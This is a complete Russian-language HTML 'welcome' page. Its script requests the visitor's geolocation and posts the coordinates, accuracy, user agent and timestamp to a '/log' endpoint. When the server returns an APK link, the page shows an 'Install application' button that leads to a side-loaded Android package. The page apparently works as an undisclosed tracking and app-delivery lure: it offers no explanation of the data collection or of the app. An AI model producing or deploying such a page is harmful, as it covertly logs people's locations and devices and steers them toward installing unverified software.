<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Добро пожаловать</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #status { margin-bottom: 15px; }
    #installBtn {
      display: none;
      padding: 12px 20px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Добро пожаловать!</h2>
  <p id="status">Получаем геолокацию...</p>
  <button id="installBtn">Установить приложение</button>

  <script>
    const status = document.getElementById('status');
    const installBtn = document.getElementById('installBtn');

    navigator.geolocation.getCurrentPosition(
      async position => {
        const geoData = {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        try {
          const res = await fetch('/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(geoData)
          });

          const result = await res.json();
          if (result && result.apk) {
            installBtn.style.display = 'inline-block';
            installBtn.onclick = () => {
              window.location.href = result.apk;
            };
            status.textContent = "Геолокация получена. Нажмите для установки приложения.";
          } else {
            status.textContent = "Геолокация получена, но установка не требуется.";
          }
        } catch (err) {
          status.textContent = "Ошибка отправки геоданных.";
        }
      },
      err => {
        status.textContent = "Ошибка геолокации: " + err.message;
      }
    );
  </script>
</body>
</html>
